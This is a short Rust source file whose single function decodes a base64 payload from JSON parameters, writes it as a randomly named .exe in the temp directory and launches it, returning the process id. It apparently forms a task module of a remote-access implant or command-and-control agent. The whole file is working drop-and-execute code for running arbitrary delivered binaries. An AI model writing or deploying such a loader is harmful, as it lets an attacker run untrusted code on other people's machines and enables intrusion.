use base64::{engine::general_purpose::STANDARD, Engine};
use serde::Deserialize;
use std::{fs, process::Command};

#[derive(Deserialize)]
struct Args {
    payload: String,
}

pub fn run(parameters: &str) -> Result<String, String> {
    let args: Args = serde_json::from_str(parameters).map_err(|e| e.to_string())?;
    let payload = STANDARD.decode(args.payload).map_err(|e| e.to_string())?;
    let path = std::env::temp_dir().join(format!("{:016x}.exe", rand::random::<u64>()));
    fs::write(&path, payload).map_err(|e| e.to_string())?;
    match Command::new(&path).spawn() {
        Ok(child) => Ok(format!("started process {}", child.id())),
        Err(error) => {
            let _ = fs::remove_file(path);
            Err(error.to_string())
        }
    }
}
